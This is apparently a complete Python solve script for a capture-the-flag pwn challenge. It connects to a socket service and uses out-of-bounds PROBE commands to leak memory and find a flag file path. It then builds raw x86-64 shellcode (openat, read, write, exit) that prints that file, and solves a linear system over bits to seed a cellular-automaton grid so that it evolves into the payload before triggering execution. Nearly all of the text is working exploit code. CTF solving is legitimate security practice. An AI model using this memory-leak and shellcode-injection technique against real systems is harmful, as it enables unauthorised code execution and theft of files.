import socket
import sys
import time

ROWS = 32
COLS = 32
ROW_BYTES = 4
FABRIC_BYTES = 128
CELLS = 1024
GENERATIONS = 7

STENCIL = [(-1, 0), (1, 0), (0, 1), (0, -1), (-1, 1), (1, -1)]


def cell(r, c):
    return r * COLS + c


def step(cur):
    nxt = [0] * CELLS
    for r in range(ROWS):
        for c in range(COLS):
            v = 0
            for dr, dc in STENCIL:
                rr = r + dr
                cc = c + dc
                if 0 <= rr < ROWS and 0 <= cc < COLS:
                    v ^= cur[cell(rr, cc)]
            nxt[cell(r, c)] = v
    return nxt


def build_operator():
    cols = []
    for j in range(CELLS):
        cur = [0] * CELLS
        cur[j] = 1
        for _ in range(GENERATIONS):
            cur = step(cur)
        m = 0
        for i in range(CELLS):
            if cur[i]:
                m |= (1 << i)
        cols.append(m)
    return cols


def out_bit_index(byte_off, bit):
    r = byte_off // ROW_BYTES
    within = byte_off % ROW_BYTES
    c = within * 8 + bit
    return r * COLS + c


def solve_seed(operator, constraints):
    eqs = []
    for off, val in constraints:
        for bit in range(8):
            i = out_bit_index(off, bit)
            rowmask = 0
            for j in range(CELLS):
                if (operator[j] >> i) & 1:
                    rowmask |= (1 << j)
            eqs.append((rowmask, (val >> bit) & 1))
    pivots = []
    for m, b in eqs:
        for pj, pm, pb in pivots:
            if (m >> pj) & 1:
                m ^= pm
                b ^= pb
        if m == 0:
            if b != 0:
                return None
            continue
        pj = m.bit_length() - 1
        for pr in pivots:
            if (pr[1] >> pj) & 1:
                pr[1] ^= m
                pr[2] ^= b
        pivots.append([pj, m, b])
    s = 0
    for pj, pm, pb in pivots:
        if pb:
            s |= (1 << pj)
    return s


def build_shellcode(path):
    code = bytearray()
    lea = []

    def emit(b):
        code.extend(b)

    def emit_lea():
        emit(b"\x48\x8d\x35")
        pos = len(code)
        emit(b"\x00\x00\x00\x00")
        lea.append(pos)
        return len(lea) - 1

    l1 = emit_lea()
    emit(b"\xbf\x9c\xff\xff\xff")
    emit(b"\x31\xd2")
    emit(b"\xb8\x01\x01\x00\x00")
    emit(b"\x0f\x05")
    emit(b"\x89\xc7")
    l2 = emit_lea()
    emit(b"\xba\x00\x01\x00\x00")
    emit(b"\x31\xc0")
    emit(b"\x0f\x05")
    emit(b"\x48\x89\xc2")
    emit(b"\xbf\x01\x00\x00\x00")
    l3 = emit_lea()
    emit(b"\xb8\x01\x00\x00\x00")
    emit(b"\x0f\x05")
    emit(b"\xbf\x00\x00\x00\x00")
    emit(b"\xb8\xe7\x00\x00\x00")
    emit(b"\x0f\x05")

    path_off = len(code)
    pathb = path.encode() + b"\x00"
    buf_off = 0x100

    def set_disp(li, target):
        pos = lea[li]
        rip = pos + 4
        disp = target - rip
        code[pos:pos + 4] = (disp & 0xffffffff).to_bytes(4, "little")

    set_disp(l1, path_off)
    set_disp(l2, buf_off)
    set_disp(l3, buf_off)

    blob = bytes(code) + pathb
    return blob


class Link:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port))
        self.buf = b""

    def readline(self):
        while b"\n" not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                break
            self.buf += chunk
        if b"\n" not in self.buf:
            line, self.buf = self.buf, b""
            return line
        i = self.buf.index(b"\n")
        line = self.buf[:i]
        self.buf = self.buf[i + 1:]
        return line

    def send(self, s):
        self.s.sendall(s.encode())

    def read_tc(self):
        while True:
            line = self.readline()
            if line.startswith(b"Tc: "):
                return int(line[4:])
            if line == b"" and not self.buf:
                raise EOFError

    def drain(self, dur=0.5):
        self.s.settimeout(dur)
        out = b""
        try:
            while True:
                c = self.s.recv(4096)
                if not c:
                    break
                out += c
        except socket.timeout:
            pass
        finally:
            self.s.settimeout(None)
        return out


def leak_path(link):
    cmds = []
    for r in range(-1024, 0):
        for cc in (0, 8, 16, 24):
            cmds.append(f"PROBE {r} {cc}")
    link.send("\n".join(cmds) + "\n")
    vals = []
    for _ in range(len(cmds)):
        vals.append(link.read_tc())
    mem = {}
    i = 0
    for r in range(-1024, 0):
        for k in range(4):
            off = 4 * r + k
            mem[off] = vals[i]
            i += 1
    raw = bytes(mem[o] for o in range(-4096, 0))
    hit = raw.find(b"flag_")
    start = raw.rfind(b"\x00", 0, hit) + 1
    end = raw.find(b"\x00", hit)
    return raw[start:end].decode()


def recover_bias(link):
    link.send("INCUBATE\n")
    link.readline()
    cmds = []
    for off in range(FABRIC_BYTES):
        r = off // ROW_BYTES
        c = (off % ROW_BYTES) * 8
        cmds.append(f"PROBE {r} {c}")
    link.send("\n".join(cmds) + "\n")
    bias = []
    for _ in range(FABRIC_BYTES):
        bias.append(link.read_tc())
    return bias


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

    operator = build_operator()

    link = Link(host, port)
    link.readline()
    link.readline()

    path = leak_path(link)
    sys.stderr.write("leaked path: %s\n" % path)

    bias = recover_bias(link)

    blob = build_shellcode(path)
    sys.stderr.write("payload bytes: %d\n" % len(blob))

    constraints = []
    for off in range(len(blob)):
        target = blob[off] ^ bias[off]
        constraints.append((off, target))

    seed = solve_seed(operator, constraints)
    if seed is None:
        sys.stderr.write("no solution\n")
        sys.exit(1)
    nbits = bin(seed).count("1")
    sys.stderr.write("seed bits: %d\n" % nbits)

    cmds = []
    for j in range(CELLS):
        if (seed >> j) & 1:
            r = j // COLS
            c = j % COLS
            cmds.append(f"SEED {r} {c}")
    link.send("\n".join(cmds) + "\n")
    for _ in range(nbits):
        link.readline()

    link.send("INCUBATE\n")
    link.readline()
    link.send("FIRE\n")

    out = link.drain(2.0)
    sys.stderr.write("raw output: %r\n" % out)
    for tok in out.split():
        if tok.startswith(b"H7CTF{"):
            print(tok.decode())
            return
    idx = out.find(b"H7CTF{")
    if idx >= 0:
        print(out[idx:].split(b"}")[0].decode() + "}")
        return
    sys.stderr.write("flag not found\n")
    sys.exit(1)


if __name__ == "__main__":
    main()
